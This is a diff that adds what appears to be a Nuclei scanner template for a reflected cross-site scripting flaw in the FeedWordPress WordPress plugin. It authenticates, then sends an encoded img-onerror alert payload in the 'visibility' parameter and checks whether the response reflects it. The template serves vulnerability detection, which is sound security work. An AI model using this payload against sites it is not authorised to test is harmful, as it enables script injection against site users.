@@ -1,0 +1,41 @@
+id: feedwordpress-xss
+
+info:
+  name: FeedWordPress < 2022.0123 - Reflected Cross-Site Scripting (XSS)
+  author: dhiyaneshDk
+  severity: medium
+  description: The plugin is affected by a Reflected Cross-Site Scripting (XSS) within the "visibility" parameter.
+  reference:
+    - https://wpscan.com/vulnerability/7ed050a4-27eb-4ecb-9182-1d8fa1e71571
+  tags: wordpress,wp-plugin,xss,feedwordpress,authenticated
+
+requests:
+  - raw:
+      - |
+        POST /wp-login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{RootURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+
+        log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      - |
+        GET /wp-admin/admin.php?page=feedwordpress%2Fsyndication.php&visibility=%22%3E%3Cimg+src%3D2+onerror%3Dalert%28document.domain%29%3E HTTP/1.1
+        Host: {{Hostname}}
+
+    cookie-reuse: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"><img src=2 onerror=alert(document.domain)>" method="post">'
+
+      - type: word
+        part: header
+        words:
+          - text/html
+
+      - type: status
+        status:
+          - 200
